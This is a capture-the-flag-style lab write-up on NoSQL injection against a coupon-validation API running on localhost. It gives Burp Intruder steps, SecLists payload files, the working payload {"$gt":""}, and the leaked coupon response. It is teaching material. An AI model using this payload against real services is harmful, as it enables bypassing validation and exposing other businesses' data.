
---

# 📖 High-Level Summary:

This lab demonstrates a **NoSQL Injection** attack on a coupon code validation feature. By injecting a malicious payload (`{"$gt":""}`), the application bypasses the coupon validation logic and returns valid coupon data, including sensitive details such as the discount amount and creation date.

---

# 📚 Definition Bank:

|**Term**|**Definition**|**Key Notes**|
|---|---|---|
|**NoSQL Injection**|A vulnerability that exploits improperly sanitized inputs in NoSQL databases.|Targets query structures with operators like `$gt` (greater than) and `$ne` (not equal).|
|**Burp Suite Intruder**|A tool for automating attacks by injecting payloads into requests.|Can be configured with payload lists to discover vulnerabilities.|
|**Payload Encoding**|The process of converting payloads to a specific format to ensure compatibility with the server.|Must be turned off for NoSQL-specific payloads to retain their structure.|
|**Status Code 422**|Unprocessable Entity: Indicates the server understands the request but cannot process it.|Useful for identifying potential injection points.|

---

# 🎯 Steps and Commands:

### Step 1: Capture the Coupon Code Request

1. Navigate to:
    
    ```plaintext
    http://localhost:8888/shop
    ```
    
2. Enter an invalid coupon code (e.g., `asdasd`) and observe the traffic in **Burp Suite**.
3. Locate the POST request in **Proxy > HTTP history**:
    - **Request URL**:
        
        ```plaintext
        POST /community/api/v2/coupon/validate-coupon
        ```
        
    - **Request Body**:
        
        ```json
        {
          "coupon_code": "asdasd"
        }
        ```

---

### Step 2: Set Up Intruder

1. Send the request to **Intruder**.
    
2. Mark the position of the **coupon_code** parameter:
    
    - Highlight `asdasd` and replace it with positional markers:
        
        ```json
        {
          "coupon_code": "§asdasd§"
        }
        ```
        
    - **Note:** The payload must preserve the JSON structure; ensure the injection is within the quotes.
3. Load the initial payload list:
    
    - Go to **Payloads** > **Load** and select:
        
        ```plaintext
        /usr/share/seclists/Fuzzing/SQLi/Generic-Sqli.txt
        ```
        
4. Run the attack and analyze the responses:
    
    - Look for status codes and response lengths that differ from the baseline.
    - **Observation:** Status code `422` with responses like:
        
        ```json
        "error":"invalid character 'z' in literal true (expecting 'r')"
        ```

---

### Step 3: Use a NoSQL-Specific Payload List

1. Switch to a NoSQL payload list:
    
    - Load:
        
        ```plaintext
        /usr/share/seclists/Fuzzing/Databases/NoSQL.txt
        ```
        
2. Turn off **Payload Encoding**:
    
    - Ensure the payloads are sent exactly as they appear in the list without URL encoding.
3. Run the attack again and analyze responses:
    
    - Identify a payload with a **200 status code**:
        
        ```json
        {"$gt": ""}
        ```

---

### Step 4: Validate the Injection

1. Observe the successful response:
    
    ```json
    {
      "success": true,
      "coupon_code": "DISCOUNT50",
      "amount": 50,
      "created_at": "2025-01-14T04:08:46.339Z"
    }
    ```
    
    - The application bypasses the coupon validation logic and exposes sensitive coupon details.

---

# 🔍 Why Does the Payload Work?

1. **NoSQL Query Logic**:
    
    - The payload:
        
        ```json
        {"$gt": ""}
        ```
        
        uses the `$gt` (greater than) operator, which evaluates the coupon code as being "greater than" an empty string.
2. **Query Manipulation**:
    
    - Original Query:
        
        ```json
        db.coupons.findOne({ "coupon_code": "asdasd" })
        ```
        
    - Injected Query:
        
        ```json
        db.coupons.findOne({ "coupon_code": { "$gt": "" } })
        ```
        
        - This matches any coupon code that is greater than an empty string, bypassing validation.
3. **Response Success**:
    
    - The application assumes the query returned a valid coupon, exposing details such as the code, amount, and creation date.

### **Why Does `{"$gt": ""}` Return a Value?**

The payload `{"$gt": ""}` works because the `$gt` operator matches any value greater than an empty string. When this is injected into the query:

json

CopyEdit

`db.coupons.findOne({ "coupon_code": { "$gt": "" } })`

1. The database searches for **any record** where the `coupon_code` is greater than an empty string (`""`).
2. Since valid `coupon_code` values (e.g., `"DISCOUNT50"`) are non-empty, the query condition is satisfied.
3. MongoDB returns the **first matching record** it finds in the `coupons` collection.

This works because the query does not require a specific coupon code; it only checks that one exists and satisfies the condition.

---

# ✅ Key Takeaways:

1. **Positional Markers in Intruder**:
    - Ensure the payload is placed correctly within the JSON structure to avoid syntax errors.
2. **NoSQL-Specific Payloads**:
    - Use appropriate payloads for NoSQL injections, and disable encoding when necessary.
3. **Analyzing Responses**:
    - Status codes like `200` or `422`, along with response content, can reveal injection points and successful payloads.

---